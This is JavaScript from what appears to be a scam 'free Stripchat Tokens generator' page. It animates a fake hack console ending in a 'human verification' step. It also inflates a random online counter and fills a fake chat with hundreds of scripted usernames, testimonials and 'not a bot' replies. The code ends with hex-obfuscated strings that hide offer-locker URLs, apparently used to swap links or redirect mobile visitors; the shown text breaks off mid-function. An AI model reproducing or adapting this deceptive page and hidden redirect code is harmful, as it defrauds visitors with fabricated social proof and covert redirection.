                    $(this).removeClass('bounce animated');
                });
                $(".message-content p.console-message").typed({
                    strings: ["<span class='console-message-connected-item'>" + $console_message_resource2_msg + "</span> Resource 2 Added Successfully"],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(85, $('#progressBarConsole'));
                    }
                });
            }, 20500);
            setTimeout(function () {
                $('.console-resourceitem2-wrapper').fadeOut();
                $(".message-content p.console-message").typed({
                    strings: ["Cleaning up injection traces..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(90, $('#progressBarConsole'));
                    }
                });
            }, 22500);
            setTimeout(function () {
                $(".message-content p.console-message").typed({
                    strings: ["Performing Automatic Human Verification..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(93, $('#progressBarConsole'));
                    }
                });
            }, 24500);
            setTimeout(function () {
                $(".message-content p.console-message").typed({
                    strings: ["<b class='highlighted'>Automatic Human Verification Failed</b>..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(93, $('#progressBarConsole'));
                    }
                });
            }, 26500);
            setTimeout(function () {
                $(".message-content p.console-message").typed({
                    strings: ["Manual Human Verification Required..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(93, $('#progressBarConsole'));
                    }
                });
            }, 28000);
            setTimeout(function () {
                $(".message-content p.console-message").fadeOut(function () {
                    $(".human-verification-wrapper").fadeIn();
                });
            }, 29500);
        }
    });


    $('.popup-tos').magnificPopup({
        type: 'inline',
        preloader: false
    });
    $('.popup-contact').magnificPopup({
        type: 'inline',
        preloader: false
    });
    $('.popup-pp').magnificPopup({
        type: 'inline',
        preloader: false
    });

    $("#video-wrapper").fitVids();

});


var ee;
var eenum2 = 334;

function dis_num3() {
    document.getElementById("online2").innerHTML = eenum2;
    var randWay = Math.floor(Math.random() * 10 + 1);
    if (randWay <= 5) {
        eenum2 = eenum2 + Math.floor(Math.random() * 10 + 1);;
    } else {
        eenum2 = eenum2 - Math.floor(Math.random() * 10 + 1);;
    }
    ee = setTimeout("dis_num3()", 1000);
}
dis_num3();

var ChatReplied = false;
var ChatDate = new Date();
var ChatUserName = '';
var ChatUserNames = ["TurtletheCat", "Pobelter", "EugeneJPark", "Doublelift", "C9Sneaky", "lamBjerg", "Popobelterold", "HOGEE", "WizFujiiN", "HotGuy6Pack", "dawoofsclaw", "TiPApollo", "Soeren", "FSNChunkyfresh", "Ariana22ROO", "Waker", "Podu", "C9Hard", "Shiphtur", "HOoZy", "Chapanya", "Dyrus", "Entranced", "WildTurtle", "WildTurtl", "lntense", "Hauntzer", "LiquidFeniX", "THExJOHNxCENA555", "Imaqtpie", "ZionSpartan", "JJackstar", "Ekkocat", "LiquidKEITH", "mldkingking", "Loopercorn", "TiPMa", "Ohhhq", "ninjamaster69xxx", "CaliTrlolz8", "ice", "C9Meteos", "JannaMechanics", "KEITHMCBRIEF", "dunamis", "Quasmire", "scorro", "LiquidQuas", "GVHauntzer", "PengYiliang", "Casely", "wahoolahoola", "godisfeng66666", "Zbuum", "ilovefatdongs", "TransIogic", "LemonBoy", "Link", "Chipotlehunter", "TDKkina", "DJTrance", "Duocek", "Hate", "KonKwon", "Nihillmatic", "Zaryab", "intero", "Biofrost", "LongCat4", "CSTJesiz", "GVKeane", "TiPyoondog", "RedoutabIe", "LiquidXpecial", "JayJ", "GVCop", "iKeNNyu", "C9Hai", "FunFrock", "CLGLourlo", "evertan", "Chaullenger", "Aniratak", "PorpoiseDeluxe", "Isuyu", "CLGDandyLite", "Arcsecond", "BloodWater", "Jynthe", "Sickoscott", "RickyTang", "DaBox", "ALLRekklesvNA", "Hoofspark", "DuBuKiD", "AdrianMa", "GuriAndGunji", "stuntopia", "RyanChoi", "AiShiTeru", "FSNMeMer", "J0kes", "C9Balls", "C9SoIo", "yungmulahBABY", "FeelTheLove", "dawolfsclaw", "BaamSouma", "NMEotter", "stuntopolis", "llRomell", "GoJeongPa", "p0z", "Trisexual", "MarkPassion", "Seeiya", "AAltec", "C9LemonNation", "maplestreet8", "Tokensenglue", "MegaZero", "VIPEEEEEEEEEEEER", "Panchie", "fabbbyyy", "halo3madsniper", "iLucent", "1k2o1ko12ko12ko2", "Bokbokimacat", "VANISHINGDRAG0N", "LiquidPiglet", "playmkngsupport", "Gambler", "Gaggiano", "JJayel", "JoopsaKid", "1brayle", "Azingy", "Kebrex", "WahzYan", "willxo", "TailsLoL", "darksnipa47", "Thyak", "JimmyTalon", "vane", "sooyoung", "lalaisland", "Lourlo", "Sunar", "PlayWithAnimals", "scarra", "HUYAGorilIA", "Lock0nStratos", "aphromoo", "KMadClown", "ChaIlengerAhri", "YY90001PiKaChu", "Thefatkidfromup", "ahqwe5tdoor", "Nintenpai", "JustJayce", "toontown", "BasedYoona", "TokensStars", "ExecutionerKen", "nicemoves", "InvertedComposer", "LiquidIWD", "Stan007", "woshishabi", "JukeKing", "xPecake", "BlGHUEVOS", "Plun", "KingCobra", "TDKSmoothie", "TSMLustboy", "C10Meteos", "lllllllllllllIII", "ohdaughter", "PekinWoof", "BrandonFtw8", "m2sticc", "DaiJurJur", "DontMashMe", "CaseOpened", "otte", "wutroletoplay", "Thurtle", "Dodo8", "Frostalicious", "bobqinXD", "MrCarter", "Hellkey", "Chimonaa1", "DaBoxII", "GVVicious", "Jummychu", "PAlNLESS", "LiLBunnyFuFuu", "Lukeeeeeeeeee", "Lattman", "Daserer", "AlliancePatrick", "Lionsexual", "St1xxay", "Kojolika", "CSTCris", "KojotheCat", "StellaLoussier", "Gleebglarbu", "Altrum", "RiotMeyeA", "Rule18", "mandatorycloud", "Tritan", "LiquidDominate", "cidadedecack", "RoA", "BillyBoss", "xPepastel", "TaketheDraw", "ST2g", "Migipooop", "dKiWiKid", "NMEflareszx", "Gundamu", "imp", "DDABONG", "Daydreamin", "Nightlie", "MRHIGHLIGHTREEL", "Shweeb", "JinMori", "Tailsz", "Bischu", "CRBRakin", "Chaox", "Grigne", "LogicalDan", "DAKular", "DifferentSword", "Geranimoo", "InnoX", "FishingforUrf", "FluffyKittens206", "ImJinAh", "CloudNguyen", "moonway", "whoishe", "TiensiNoAkuma", "Ethil", "nothinghere", "SuperMetroid", "hiimgosu", "Mammon", "BGJessicaJung", "coBBz", "waitingforu", "LearningToPIay", "YiOwO", "heavenTime", "AnDa", "WakaWaka", "hashinshin", "TDKKez", "MariaCreveling", "Cypress", "YahooDotCom", "Phanimal", "Aror", "RFLegendary", "BenNguyen", "AHHHHHHHHH", "Linsanityy", "Valkrin", "Gate", "Allorim", "Johnp0t", "Superrrman", "Laughing", "AKAPapaChau", "denoshuresK", "Anthony", "Nightblue3", "Aranium", "Pallione", "BamfDotaPlayer", "FakerSama", "xiaolan", "Sweept", "HooManDu", "XiaoWeiXiao", "HctMike", "Revenge", "Apauloh", "latebloomer", "CRBFyre", "MongolWarrior", "Hiphophammer", "CoachLFProTeam", "hiimria", "Jackoo", "Saskio", "DadeFakerPawn", "GVStvicious", "NeonSurge", "NMEBodydrop", "MatLifeTriHard", "PantsareDragon", "GinormousNoob", "IMbz", "miqo", "VoyboyCARRY", "Hakuho", "Hexadecimal", "themassacre8", "Ayr", "SeaHorsee", "F0rtissimo", "GamerXz", "Remie", "Soghp", "Raimazz", "Ultimazero", "bigfatlp", "NMETrashyy", "C9LOD", "Popuh", "SAGASUPVEIGM", "Iamagoodboy", "TrollerDog", "Descraton", "LiquidInoriTV", "MiniMe", "IlIlIIIlIIIIlIII", "Shweebie", "KatLissEverdeen", "PoppersOP", "B1GKr1T", "DGB", "stephyscute2", "TEESEMM", "Cyprincess", "baohando", "urbutts", "maplestreeTT", "jamee", "SawitonReddit", "VeryBitter", "BenignSentinel", "MrJuvel", "Denny", "LeeGuitarStringa", "DKrupt", "LAGEhsher", "eLLinOiSe", "MochiBalls", "Sonnynot6", "ixou", "Taeyawn", "Dezx", "7hThintoN", "BeautifulKorean", "VwSTeesum", "TLIWDominate", "Vsepr", "ktSmurf", "Vultix", "Soredemo", "ROBERTxLEE", "AnnieBot", "aksn1per", "IamFearless", "FrostyLights", "SoYung", "Tuoooor", "Polx", "Agolite", "CloudWater", "Delta", "LAGOrbwalk", "sexycan", "SimonHawkes", "Rohammers", "NMEInnoX", "ChineseJester", "IAmDoughboy", "Cytosine", "Vanxer", "SDiana2", "Araya", "TheItalianOne", "F1Flow", "Kazahana", "Malajukii", "xiaoweiba", "JoshMabrey", "shinymew", "Event", "freelancer18", "ZnipetheDog", "hiitsviper", "HappyBirfdizzay", "Abou222", "Gir1shot2diamond", "KiNGNidhogg", "PurpleFloyd", "Rathul", "Kwaku", "BeachedWhaIe", "14h", "Xpecial", "CLGThink", "Aiciel", "oerh", "butttpounder", "TalkPIayLove", "jordank", "TwistyJuker", "MeganFoxisGG", "NiHaoDyLan", "TallerACE", "Doomtrobo", "Wardrium", "TwtchTviLoveSezu", "Westrice", "iMysterious", "BennyHung", "EnmaDaiO", "xTc4", "FallenBandit", "RumbIeMidGG", "deft1", "GochuHunter", "XxRobvanxX", "DuoChiDianShi", "coLBubbadub", "LeBulbe", "TanHat", "Dusty", "Jibberwackey", "Tallwhitebro", "llllllllllllIIII", "LilBuu", "Diamond", "cesuna", "BigolRon", "xSojin", "Gh3ttoWatermelon", "KingofMemes", "111094Jrh", "bive", "Yammy", "FasScriptor", "Docxm", "GVBunnyFuFuu", "Alphabetical", "Liquidzig", "YouHadNoDream", "TINYHUEVOS", "Sheepx", "GangstaSwerve", "LeBulbetier", "amandagugu", "Rushmore", "AnnieCHastur", "OverlordForte", "Muffintopper66", "Kazura", "zetsuen", "wozhixiangyin", "CaptainNuke", "alextheman", "Seongmin", "Working", "kyaasenpaix3", "gurminder", "VwSKhoachitizer", "TGZ", "KrucifixKricc", "Kevnn", "Academiic", "ArianaLovato", "Elemia", "CLGDeftsu", "XerbeK", "CeIestic", "RedEyeAkame", "Kerpal", "xFSNSaber", "MakNooN", "Hcore", "MrGamer", "zeralf", "Fenixlol", "Indivisible", "SHOWMETHEMONEY", "Adorations", "Niqhtmarex", "RambointheJungle", "Iucid", "iOddOrange", "Uncover", "DD666666", "r0b0cop", "VictoricaDebloiz", "Gleebglarb", "EmperorSteeleye", "SillyAdam", "WWWWWWWWWWWWWWMW", "tempname456543", "FeedOn", "iJesus69", "OmegaB", "Riftcrawl", "Xandertrax", "Krymer", "TwistedSun", "DeTRFShinmori", "RiceFox", "iKoogar", "Mizuji", "White", "zgerman", "FORG1VENliftlift", "sakurafIowers", "xSaury", "PiPiPig", "Pyrr", "TheCptAmerica", "NtzNasty", "SlowlyDriftnAway", "cre4tive", "LAGTokensenShiv", "FSNDLuffy", "NintendudeX", "duliniul", "Cybody", "Odete49", "TFBlade", "Platoon", "CopyCat", "BarbecueRibs", "TitanDweevil", "HeroesOfTheStorm", "JRT94", "RedBerrrys", "Rockblood", "YoloOno", "BalmungLFT", "IreliaCarriesU", "LikeAMaws", "PaulDano", "ErzaScarIet", "KiritoKamui", "ProofOfPayment", "DonPorks", "BarronZzZ", "Pikaboo", "aLeo", "MikeytheBully", "7Qing", "BillyBossXD", "DragonRaider", "Haughty", "KMadClowns", "ikORY", "Nikkone", "WeixiaTianshi", "QQ346443922", "FoxDog", "Tahx", "Hawk", "Haruka", "Scrumm", "cackgod", "iAmNotSorry", "coLROBERTO", "GladeGleamBright", "MonkeyDufle", "M1ssBear", "theletter3", "Sandrew", "RongRe", "MrGatsby", "xBlueMoon", "Merryem", "ElkWhisperer", "Enticed", "Draguner", "DeliciousMilkGG", "Patoy", "Lucl3n3Ch4k0", "Smoian", "Piaget", "Xiaomi", "zeflife", "IsDatLohpally", "HatersWantToBeMe", "Blackmill", "PrinceChumpJohn", "NhatNguyen", "Nebulite", "IAmTheIRS", "TedStickles", "LOD", "CallMeExtremity", "kimjeii", "Kappasun", "JJJackstar", "TSMMeNoHaxor", "Zealous", "Normalize", "Topcatz", "KimchimanBegins", "DrawingPalette", "AnarchyofDinh", "hiimxiao", "MikeHct", "Manco", "ChumpJohnsTeemo", "Heejae", "delirous", "Iodus", "WakaWakaWak", "Hawez", "ThaOGTschussi", "TwistedFox", "PureCorruption", "HotshotGG", "Turdelz", "ysohardstylez", "Brainfre3z", "ilyTaylor", "Zaineking", "QualityADC", "LingTong", "DyrudeJstormRMX", "AnObesePanda", "silvermidget", "CornStyle", "LafalgarTaw", "Zeyzal", "Meowwwwwww", "Pokemorph", "JimmyHong", "Hoardedsoviet", "Nematic", "C9Yusui", "BlownbyJanna", "Sojs", "Cerathe", "FairieTail", "Xeralis", "ichibaNNN", "SerenityKitty", "Contractz", "WWvvWvvWvvwWwvww", "BlueHole", "SAGANoPause", "Mookiez", "RiotChun", "ValkrinSenpai", "HeXrisen", "CptJack", "Sleepyz", "HurricaneJanna", "ToxiGood", "ItsYourChoice", "TaintedDucky", "probablycoL", "Ina", "FreeGaming", "Phaxen", "tofumanoftruth", "xHeroofChaos", "Rockllee", "Sunohara", "Ryzer", "SpiritDog", "Kazma", "Sjvir", "Maulface", "SombreroGalaxy", "Bebhead", "ecco", "AurionKratos", "RoseByrne", "Kammgefahr", "VwSSandvich", "TDKLouisXGeeGee", "Picarus", "erwinbooze", "xrawrgasm", "Tangularx", "CSauce", "Back2Nexus", "SepekuAW", "Chuuper", "Airtom", "pro711", "Theifz", "SirhcEezy", "LuckyLone56", "AtomicN", "Splorchicken", "00000000", "UpAIlNight", "k3soju", "MikeyC", "s7efen", "FENOMENO", "XIVJan", "Splorgen", "djpocketchange", "Oasis", "Iggypop", "BallsInYourFace", "dopa7", "MasterDragonKing", "ssforfail", "MissyQing", "Endlesss", "badeed", "SmooshyCake", "Karmix", "Alestz", "svbk", "KissMeRDJ", "TeaMALaoSong", "drallaBnayR", "CHRISTHORMANN", "KnivesMillions", "MahNeega", "Sphinx", "Impasse", "Stefono62", "CLGEasy", "GankedFromAbove", "IslandLager", "MrJuneJune", "BrianTheis", "ShorterACE", "morippe", "Meatmush", "Dusey", "Paperkat", "Submit", "TooPro4u", "Porogami", "iuzi", "Suzikai", "TDKNear", "LiquidInori", "Deleted", "NtzLeopard", "UnKooL", "Desu", "Born4this", "sickening", "AllianceMike", "Dinklebergg", "YouGotFaker", "FusionSin", "IMBAYoungGooby", "Neverlike", "BestGodniviaNA", "FFat20GGWP", "kMSeunG", "AliBracamontes", "rua0311desuyo", "54Bomb99", "jivhust", "Penguinpreacher", "Yashimasta", "Erurikku", "ReeferChiefer420", "WonderfulTea", "Gamely", "OberonDark", "Imunne", "Hoeji", "xTearz", "NicoleKidman", "DonDardanoni", "Wonderfuls", "HentaiKatness69", "Ayai", "EREnko", "Cruzerthebruzer", "Connort", "Anoledoran", "BiggestNoob", "Anangelababy007", "TrojanPanda", "MasterCoach", "Kirmora", "wswgou", "NMEotterr", "DragonxCharl", "uJ3lly", "moosebreeder", "Strompest", "Kurumx", "Protective", "LegacyofHao", "DkBnet", "koreas", "AxelAxis", "NiMaTMSiLe", "Preachy", "WoahItsJoe", "XXRhythmMasterXX", "Lemin", "Destinedwithin", "Afflictive", "Nydukon", "Herald0fDeath", "ChowPingPong", "QuanNguyen", "interest", "Slylittlefox121", "VictimOfTalent", "chadiansile", "iToradorable", "BIackWinter", "Mazrer", "NKSoju", "nhocBym", "Dreemo", "Virus", "CowGoesMooooo", "Masrer", "Michaelcreative", "Emanpop", "Druiddroid", "KevonBurt", "Magicians", "HiImYolo", "LoveSick", "kamonika", "Chunkyfresh", "tongsoojosim", "hiimrogue", "Zookerz", "LiShengShun", "DeTFMYumenoti", "EddieMasao", "AGilletteRazor", "andtheknee", "Hazedlol", "SrsBznsBro", "Spreek", "Toxil", "JustinJoe", "Silverblade12345", "WalterWhiteOG", "SwiftyNyce", "Volt", "DoctorElo", "Connie", "DELLZOR", "aiopqwe", "MidnightBoba", "Sikeylol", "Warmogger", "Melhsa", "OmekoMushi", "Life", "SleepyDinosaur", "Leonard", "CatVomit", "Likang45", "PSiloveyou", "xtsetse", "ClydeBotNA", "Cpense", "Arakune", "shadowshifte", "LeeBai", "SexualSavant", "CornChowder", "DeTRFEsteL", "Astro", "deDeezer", "Jayms", "v1anddrotate", "JGLafter", "UhKili", "Aceyy", "Zik", "RiNDiN", "Grandederp", "KawaiiTheo", "Senjogahara", "Th3FooL", "GusTn", "TheTyrant", "GoJeonPa", "DJJingYun", "Egotesticle", "IoveLu", "OGNEunJungCho", "kevybear", "ImJas", "Agrorenn", "Synxia", "DouyuTVForgottt", "GrimSamurai", "6666666666666", "RockleeCtrl", "Xode", "QQ459680082", "KittenAnya", "Zakard", "MARSIRELIA", "WallOfText", "SireSnoopy", "kelppowder", "Hxadecimal", "onelaugh", "MisoMango", "PiggyAzalea", "MisterDon", "VirginEmperor", "suzuXIII", "P18GEMEINV", "Kurumz", "kjin", "CcLiuShicC", "ExileOfTheBlade", "Iambbb", "Fubguns", "Asutarotto", "WhatisLove", "Niqhtmarea", "L0LWal", "JannaFKennedy", "Steffypoo", "KillerHeedonge", "AsianSGpotato", "whiteclaw", "GATOAmyTorin", "lovemyRMB", "Frostarix", "voyyboy", "Melo", "RiotZALE", "ElvishGleeman", "givesyouwiings", "LoveIy", "Packy", "Ntzsmgyu", "Susice", "Dontqqnubz", "mikeshiwuer", "Chulss", "MASTERDING", "Scorpionz", "KKOBONG", "Veeless", "NtzMoon", "Leesinwiches", "RefuseFate", "TP101", "ozoss0", "SeaShell", "Baesed", "Foolish", "jivhust1", "KMadKing", "CHRlSS", "jbraggs", "BeefTacos", "Xoqe", "Naeim", "Aerodactyl", "Triett", "194IQredditor", "Pulzar", "Windgelu", "Suadero", "Zulgor", "Senks", "cAbstracT", "SwagersKing", "AkameBestGirl", "ThePrimaryEdict", "arthasqt", "Lobstery", "MisterOombadu", "TheFriendlyDofu", "Oryziaslatipes", "ugg1", "Flandoor", "HawkStandard", "wimbis", "JimmerFredette", "VikingKarots", "Sorcerawr", "Ciscla", "Suffix", "MrCow", "METALCHOCOB0", "Dessias", "LevelPerfect", "midVox", "Junha", "Hickus", "gamepiong", "AirscendoSona", "HellooKittie", "Jesse", "Rainaa", "ILoveNASoloQ", "Colonelk1", "DeTRFZerost", "Szmao", "TacoKat", "1tzJustVictor", "HomedogPaws", "DioDeSol", "PeterBrown", "FrannyPack", "AbsoluteFridges", "TheBiddler", "ELMdamemitai", "Old", "Pavle", "nathanielbee", "MakiIsuzuSento", "nweHuang", "EvanRL", "yorozu", "forgivenbow", "alexxisss", "Cloverblood", "Entities", "Believe", "Chiruno", "Xiaobanma", "BestJanna", "Neko", "TheEyeofHorus", "IGotSunshine", "Shade20", "Sprusse", "Imacarebear", "Kenleebudouchu", "LockDownExec", "Chubymonkey", "HunterHagen", "Applum", "DaoKho", "MrBlackburn", "beatmymeat", "BestDota2Sona", "chubbiercheeks", "KillaKast", "Betsujin", "TheAmberTeahouse", "BellaFlica", "ManateeWaffles", "Babalew", "charmanderu", "TooSalty", "LotusBoyKiller", "Bulgogeeeee", "Nerzhu1", "Lovelyiris", "QuantumFizzics", "freakingnoodles", "Pdop1", "Bakudanx", "Martel", "DoctorDoom", "equalix", "CARDCAPTORCARD", "Dyad", "Papasmuff", "TheBroskie", "Wadenation", "Flyinpiggy", "Wingsofdeathx", "IamOsiris", "ArtThief", "LotusEdge", "fwii", "Kios", "Shampu", "Nickpappa", "Yukari", "RayXu", "Emeraldancer", "TwoPants", "EnzoIX", "Jacka", "Plumber", "Skadanton", "C9TGleebglarbu", "BonQuish", "GrimmmmmmmReaper", "SmoSmoSmo", "MewtMe", "Ramzlol", "Mruseless", "Eitori", "S0lipsism", "X1337Gm4uLk03rX", "lloveOreo", "MrChivalry", "Oyt", "AnVu", "RBbabbong", "MASTERROSHl", "dabestmelon", "Potatooooooooooo", "KasuganoHaru", "C9BalIs", "stainzoid", "MrArceeSenpaiSir", "sweetinnocence", "Firehazerd", "EpicLynx", "2011", "PandaCoupIe", "Moelon", "KingKenneth", "Skinathonian", "FelixCC", "snowmine", "Acme", "QmoneyAKAQdollas", "Fexir", "ImbaDreaMeR", "ImNovel", "ButtercupShawty", "touch", "penguin", "Promitio", "DeTRFMoyashi", "Hordstyle", "Iizard", "Jintae", "pichumy", "Upu", "Iemonlimesodas", "TwitchTvAuke", "Promises", "Jintea", "OMikasaAckermanO", "wompwompwompwomp", "Kiyoon", "LiquidNyjacky", "ATColdblood", "SandPaperX", "0Sleepless", "pr0llylol", "AxelsFinalFlame", "DrSeussGRINCH", "ZENPhooka", "oMizu", "HamSammiches", "Pcboy", "RamenWithCheese", "Yook", "Dafreakz", "Winno", "XxWarDoomxX", "LifelessEyes", "UrekMazin0", "FrenchLady", "Pillowesque", "GodOfZed", "D3cimat3r", "broIy", "1stTimeDraven", "Exxpression", "godofcontrol", "nokappazone", "Shoopufff", "IlIIlIIIlIIIIIII", "Fragnat1c", "Abidius", "irvintaype", "YellOwish", "japanman", "CaristinnQT", "LeithaI", "Kitzuo", "Akatsuki", "ROBERTZEBRONZE", "aenba", "Arcenius", "Torgun", "Ryden7", "Entus", "CutestNeo", "MonkeyDx", "Xerosenkio", "JHHoon", "DeTFMCeros", "Rakinas", "MetaRhyperior", "MegaMilkGG", "EmilyVanCamp", "SecretofMana", "Snidstrat", "SJAero", "Mixture", "Teaz89", "ArizonaGreenTea", "AKASIeepingDAWG", "sh4pa", "Hanjaro", "BestFelixNA", "Dragles", "TummyTuck", "sciberbia", "KLucid", "Isunari", "lAtmospherel", "Zwag", "yuBinstah", "ionz", "Nove", "Nickywu", "BlueRainn", "lilgrim", "Rekeri", "Kaichu", "Arnold", "ArcticPuffin11", "UnholyNirvana", "IREGlNALD"];
var ChatContent = ["How much Stripchat Tokens can I generate?", "Anyone tried this already?", "Does it work in NA?", "Why this is so easy lol?", "This is incredible, never thought it would work.", "I generated 100000 Tokens, can't wait to start.", "ios player here, works flawless.", "Can someone help me with the survey?", "OMG!", "LOL!", "ROFL!", "Real", "haha", "easy", "bro", "What can I do here?", "Shut up man I love this website", "hi guys", "How much Tokens u made so far?", "what about surveys on mobile phone?", "Is this free?", "How long do you have to wait?", "Yea", "No", "I know", "Exactly why this is so good", "uhm", "maybe", "I can't wait anymoreeee", "Is this for real guys?", "Thanks man I appreciate this.", "Cool =)", "<message deleted>", "oh god", "damn", "I love this", "Never imagined this would work but damn its so simple", "saw this on forums pretty impressive", "yo guys dont spam okay?", "anyone up for a game?", "you think this will be patched any time soon", "pretty sure this is saving me a lot of money", "any idea how long it takes for Tokens and Resource 2 to come?", "so happy i found this", "you guys watch nightblue?", "I have seen this website on twitch stream i think", "just wow", "Where do I get my Tokens and Resource 2?", "a friend told me about this", "thanks to whoever spams this website lol", "where i put in my code?", "so far I am cool with this", "can I get for free?", "bye guys", "okay i applied thank you", "how much can you even have", "incredible", "ten minutes", "need to go now", "brb", "You should give it a try", "dont regret being here", "fucking is real", "omg stop asking how to get Stripchat Tokens just get it from generator", "guys this is so easy, it takes less than a minute", "Can anyone do it for me? My username is brazilinaronaldo", "PM me pls", "shadow fight sucks noobs haha", "EA pls", "today is lucky day", "this is the best Stripchat Tokens website because we all have more than a chance", "i think everyone here got Tokens", "when can I play I am new to this", "Stripchat Tokens for free?", "Do Tokens expire?", "I got big pack of Tokens for my girlfriend making her happy and i dont pay for them lol", "man servers are always down fuk it", "funny how this works but it does like always", "hi again im here for more Tokens", "i need some Stripchat Tokens what do i do", "this worked lol", "fuck i have no surveys left, had like 50k already on my acc", "where do all of you come from", "nice page for Stripchat Tokens", "i was stuck in survey had to do again but it worked then", "thank you for giving me Tokens!", "saw on stream yo", "Stripchat Tokens working fine", "i love Stripchat so much", "this makes my game more enjoyable i hope", "thank you all for helping me out bros", "thanks to whoever pmed me it worked", "thank you for messaging me man", "when do you wanna play?", "imagine all the people waiting fo this", "any idea if this still works tomorrow", "best Tokens website", "is this twitch chat?", "wow really many people online here", "hi all who has some Tokens for me", "anyone not here for Stripchat lol?", "what was the newest expansion", "who is up for a chat hehe?", "i play in EU", "check my profile i am rich", "when is Tokens start men?", "even noobs can do this", "when did you guys start playing wow", "i can only recommend this stuff", "great i can test the expansion before purchasing it", "can't wait for it to start!", "where do you come from?", "does this giveaway go forever?", "pretty good Tokens signup form guys", "i begin to like this very much. third pack i unlocked", "worth", "ok cool", "i see no limits on how Tokens you can get thats so epic", "which country are you playing in guys?", "think so man", "Likely, but I think one day this will fail", "this still works at the moment", "i havent seen this before but im impressed with the result!", "my boyfriend will freak out :D", "nice ", "surveys dont appaer every time but i think its there to have enough money for the website to buy get the Tokens codes", "actually i had no problem with any survey ever, just try?", "this website is used a lot sometimes you have to wait a bit", "where did you find this?", "so when will Tokens start?", "ty for the Tokens opt in guys!", "i wish i found this earlier", "i wasted so much money on Stripchat lol - good this is free here", "how come i dont see any trolls here", "just dodged queue for this", "any bro needs help?", "i would do screenshot but maybe you report me then", "are there new weapons in this expansion pack?", "did you try 14,500 pack yet? I used on NA but maybe other locations can use it too", "trololo Stripchat sucks hahahaha", "i feel like this will be the best! it was starting to get boring lol", "think so", "what you can get Tokens here for free?", "ok sounds good enough for me bros", "anyone reddit here?", "Okay I believe this works cus I just logged in and saw my Tokens ROFL", "I had a bit trouble with some survy thing but no problem if you just choose an easy", "my friends on facebook spam this like every day they are rly happy about it", "Where do i put my phone", "what?", "yes i got it too", "why would someone just go here to hate and spam pff", "noobs pls if you dont know how to do it dont spam here okay", "great generator good i found this", "hope not too many kids in this chat", "josh are you here?", "unlocking takes some time for me", "derp", "i am curious is this legit?", "Works on OCE?", "had to reload page before it worked", "used this three times and applied for 3  14.500 coin packs, lol see you ingame suckers", "i see most people here write positive things it is true?", "hi my english no good i here get Stripchat Tokens?", "Exactly what I think", "you can have reginalds IQ and still be able to get Tokens", "when i came first to this website i was like most of you guys just spamming here the chat, in the end im glad that i tried it because now for next year or so i am not leaving my room", "if you want a proof add me on skype", "I thought Stripchat is slowly dying, i hope this release will get some players back", "thank you!", "are you not bored at all? i cant wait for expansion pack", "i am looking for a friend please pm me", "i thought my friend wanted to fool me with this website link. but you can rly get Tokens here if you dont mess up with the survey part", "aasdasdasd", "Ok so I am back and what I can say is that i got my Tokens! I can not do a screenshot cus the chat would block any links meh but rly go try it its worth it", "worth got my Tokens key", "i agree", "i am fine with having free Tokens how about you", "what i always disliked is when you get close to release date and they move it even further", "from all websites ive been on this is the first and probably the only one which rly gives you the Stripchat Tokens", "i have tried too many surveys in my life finally i got lucky here ", "yeah free Tokens is cool", "you like this?", "What you think about all this", "I want to play from korea", "wow i waited ages to get a server transfer now here it shouldnt be a problem anymore", "lol ProAsh32 is here? you were in my skype! how are you guy", "i checked some of the people accounts here they are actually real humans maybe not all though", "now the secret is solved", "this works for EU players right?", "hey i am a newbie will i be able to play?", "i signed up, now the waiting starts :/ i hope they will launch sooner", "can i do this with my nexus phone?", "...^^", "fucking hilarious some people", "Stripchat Tokens here I come", "wow 10 minutes ago this was empty now all people here wtf", "i dont rly like Stripchat go", "god thanks for Stripchat go finally", "i can imagine that", "okay", "not sure if i understood? its all free right?", "I would be so sad if this did not work because it took a while, thankfully it worked then", "uhm", "so you can buy 1000000 Toads now guys?", "i think with the new game might become somewhat more interesting", "fucking helll! got my Tokens!.", "yayy", "servers i tested this and its working", "i usually choose the first offer in the list because its normally the easiest one", "i think some offers easier in countries like USA", "if you chose an offer make sure to finish it complete or you will not sign up for Tokens guys!"];
var ChatAntiBot = ["Fuck you I'm not a bot", "Does this sound like a bot to you noob?", "yeah we're all bots Kappa", "bot? i'm here for spamming this shit lol", "are you stupid or something? they have anti bot protection", "sure bot, 0101010110 lmao xD", "no, we're not bots Kappa"];


var _0x7185 = ["\x68\x72\x65\x66", "\x76\x65\x72\x69\x66\x79", "\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64", "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x61\x6D\x69\x6E\x67\x62\x75\x66\x66\x73\x2E\x63\x6F\x6D\x2F\x6F\x67\x2E\x70\x68\x70\x3F\x74\x6F\x6F\x6C\x3D\x63\x6C\x26\x69\x64\x3D\x31\x65\x30\x66\x39\x37\x32\x34\x38\x66\x34\x35\x63\x39\x37\x37\x35\x64\x61\x38\x33\x31\x34\x32\x64\x61\x36\x30\x61\x33\x39\x31", "\x77\x69\x64\x74\x68", "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x75\x72\x6C\x2E\x63\x6F\x6D\x2F\x68\x75\x6D\x61\x6E\x2F\x69\x6E\x64\x65\x78\x2E\x68\x74\x6D\x6C", "\x69\x6E\x64\x65\x78\x4F\x66", "\x6C\x6F\x63\x61\x74\x69\x6F\x6E", "\x72\x61\x6E\x64\x6F\x6D", "\x66\x6C\x6F\x6F\x72", "\x6F\x6E\x6C\x6F\x61\x64", "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x61\x6D\x69\x6E\x67\x62\x75\x66\x66\x73\x2E\x63\x6F\x6D\x2F\x6F\x67\x2E\x70\x68\x70\x3F\x74\x6F\x6F\x6C\x3D\x63\x6C\x26\x69\x64\x3D\x34\x30\x63\x63\x62\x38\x36\x31\x31\x34\x38\x62\x34\x64\x62\x33\x35\x61\x35\x64\x38\x30\x39\x35\x36\x39\x31\x34\x64\x37\x66\x63"];
if ((document[_0x7185[2]](_0x7185[1])[_0x7185[0]] != _0x7185[3]) && (screen[_0x7185[4]] <= 720)) {
    0 > window[_0x7185[7]][_0x7185[0]].toString()[_0x7185[6]](_0x7185[5]) && 0 == Math[_0x7185[9]](100 * Math[_0x7185[8]]() / 50) && (window[_0x7185[10]] = function () {
